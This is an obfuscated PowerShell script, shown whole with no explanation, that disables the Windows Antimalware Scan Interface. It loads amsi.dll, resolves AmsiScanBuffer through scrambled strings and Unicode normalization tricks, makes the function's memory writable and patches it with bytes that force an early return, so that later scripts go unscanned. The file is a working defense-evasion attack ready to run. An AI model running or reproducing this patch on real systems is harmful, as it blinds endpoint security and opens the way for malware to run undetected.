$A_9KvXocXjxpebgVC = @"
using System;
using System.Runtime.InteropServices;
public class A_9KvXocXjxpebgVC {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr ayWy3tPwBnk, string O2SFz870hxyCOtsN7lI4);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr fv9jLqKkYmBtIbXZna, UIntPtr rhdzOe3EFf, uint kkAo7wIW_JEO3M_wn, out uint CF5S4h48TPW85zA2FoT);
}
"@

Add-Type $A_9KvXocXjxpebgVC

$KzSya6t7nQh4M = [A_9KvXocXjxpebgVC]::LoadLibrary("$(('ãmsì.'+'dll').nOrMALize([CHAR](70*39/39)+[cHar](111+52-52)+[CHaR](114)+[CHar](109+57-57)+[cHAr]([byTe]0x44)) -replace [CHAr]([ByTe]0x5c)+[chAR]([BYte]0x70)+[ChaR](123*81/81)+[ChAr](77)+[CHaR](110*102/102)+[ChAR](125+61-61))")
$hqBuyNjCVeKKbxcI7QP = [A_9KvXocXjxpebgVC]::GetProcAddress($KzSya6t7nQh4M, "$(('ÄmsìScànB'+'ùffèr').normALiZe([cHAR](8+62)+[CHAr]([ByTE]0x6f)+[chAR](110+4)+[CHaR](14+95)+[ChaR]([BytE]0x44)) -replace [CHar](2+90)+[cHaR]([BYte]0x70)+[char]([Byte]0x7b)+[CHaR]([bytE]0x4d)+[CHAR]([ByTe]0x6e)+[cHAR]([BytE]0x7d))")
$p = 0
[A_9KvXocXjxpebgVC]::VirtualProtect($hqBuyNjCVeKKbxcI7QP, [uint32]5, 0x40, [ref]$p)
$Xd16TFaqxFWIczwP = "0xB8"
$uTj2tj = "0x57"
$Cq5DA_rNY = "0x00"
$bCYbUpjnDw4_Ql5r = "0x07"
$La4JmO_zZkm5_ = "0x80"
$x035zg2OMItuqbQL = "0xC3"
$MlOv0q508CdpsQy7Mx = [Byte[]] ($Xd16TFaqxFWIczwP,$uTj2tj,$Cq5DA_rNY,$bCYbUpjnDw4_Ql5r,+$La4JmO_zZkm5_,+$x035zg2OMItuqbQL)
[System.Runtime.InteropServices.Marshal]::Copy($MlOv0q508CdpsQy7Mx, 0, $hqBuyNjCVeKKbxcI7QP, 6)